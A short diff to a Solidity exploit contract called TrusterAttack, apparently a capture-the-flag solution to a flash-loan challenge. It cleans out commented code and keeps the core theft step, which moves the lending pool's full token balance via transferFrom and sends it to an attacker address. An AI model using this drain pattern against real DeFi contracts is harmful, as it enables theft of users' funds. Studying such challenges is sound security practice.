@@ -26,7 +26,6 @@ contract TrusterAttack {
                 address attackerAddress
                ) 
     {
-//        console.log("Sender balance is %s tokens", balances[msg.sender]);
         console.log("Trying to send from %s to %s", tokenAddress, attackerAddress);
         token = IERC20(tokenAddress);
         attacker = attackerAddress;
@@ -45,16 +44,7 @@ contract TrusterAttack {
             )
         );
         console.log("Flashloan complete %s", token.balanceOf(attacker));
-        //token.transfer(pool, transferAmount);
-        //IERC20(tokenAddress).transfer(attackerAddress, balance);
-        //calldata = approve(pool, this)
-        //response 
         token.transferFrom(poolAddress,address(this) , balance);
         token.transfer(attacker,balance);
-        //
-    }
-    // function transferMe() public{
-    // }
-
-   
+    }   
 }
